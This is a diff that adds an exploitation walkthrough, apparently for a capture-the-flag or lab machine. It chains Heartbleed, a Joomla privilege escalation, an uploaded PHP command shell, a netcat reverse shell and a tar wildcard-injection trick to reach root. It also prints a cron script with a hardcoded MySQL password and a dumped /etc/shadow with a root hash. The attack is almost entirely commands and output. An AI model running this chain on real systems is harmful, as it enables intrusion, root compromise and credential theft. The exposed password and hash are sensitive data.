@@ -1,0 +1,71 @@
+1] Heartbleed (best is https://github.com/robertdavidgraham/heartleech but needs openssl recompilation and then ./heartbleed -s [url] -p 443 -t 1 -f output)=> reveal joomla path
+2] Joomla privilege elevation => become admin of joomla with http://jeffchannell.com/Joomla/joomla-161725-privilege-escalation-vulnerability.html
+3] Upload of exploit.php => url?cmd=...
+4] Reverse shell => connect with url to our nc -l -p 4444 -vvv
+5] See /backup content => following script :
+
+#!/bin/bash
+# crontab every 1 minute
+
+IP=$(/sbin/ifconfig | grep 'Bcast' | awk -F':' '{print $2}' | tr -d ' Bcast' | tail -1 | tr -d '\n')
+INDEX=$(wget https://${IP}/9cc241ad23332e598db0f9d52ced5850/index.php --no-check-certificate -O /tmp/index 2>&1)
+
+VERIF=$(md5sum /tmp/index | awk '{print $1}')
+MD5SUM=$(tail -1 /root/tmp_md5.txt)
+echo $VERIF
+
+if [[ $VERIF == $MD5SUM ]]
+  then
+        echo OUI
+  else
+        echo $VERIF > /root/tmp_md5.txt
+        cd /var/www/9cc241ad23332e598db0f9d52ced5850
+        tar czf /backup/archive_old.tar.gz *
+	mysqldump -u joomla --password=pZV56Vx48jvQLTaE --databases joomla > /backup/joomla.sql
+        rm /tmp/index
+fi
+
+6] Use tar Vulnerability :
+cd /var/www/9cc241ad23332e598db0f9d52ced5850
+cat<<EOF>script2.sh
+ls -Al > abcdefghijkl
+ls -Al > /bcdefghijk
+cat /passwd > /abcdefghijk
+cat /etc/shadow > /abcdefghijkl
+EOF
+
+touch -- "--checkpoint=1"
+touch -- ./--checkpoint-action=exec=sh\ script2.sh
+echo "oooppo" > index.php
+
+
+7] Wait and see :
+
+cat /abcd*
+
+3068e142a22ad37d4189b1d9bdb44a18
+
+root:$6$sQk/wmyV$UGmV3ShgQpm4HjOT38baKtefSUouklBLlHp5Lj9lAcT6IjniJ490uxPJcz67YJLbvFzZXyRYlP1NbCFTQbGQg/:16414:0:99999:7:::
+daemon:*:16411:0:99999:7:::
+bin:*:16411:0:99999:7:::
+sys:*:16411:0:99999:7:::
+sync:*:16411:0:99999:7:::
+games:*:16411:0:99999:7:::
+man:*:16411:0:99999:7:::
+lp:*:16411:0:99999:7:::
+mail:*:16411:0:99999:7:::
+news:*:16411:0:99999:7:::
+uucp:*:16411:0:99999:7:::
+proxy:*:16411:0:99999:7:::
+www-data:*:16411:0:99999:7:::
+backup:*:16411:0:99999:7:::
+list:*:16411:0:99999:7:::
+irc:*:16411:0:99999:7:::
+gnats:*:16411:0:99999:7:::
+nobody:*:16411:0:99999:7:::
+libuuid:!:16411:0:99999:7:::
+Debian-exim:!:16411:0:99999:7:::
+statd:*:16411:0:99999:7:::
+sshd:*:16411:0:99999:7:::
+mysql:!:16411:0:99999:7:::
+postfix:*:16411:0:99999:7:::
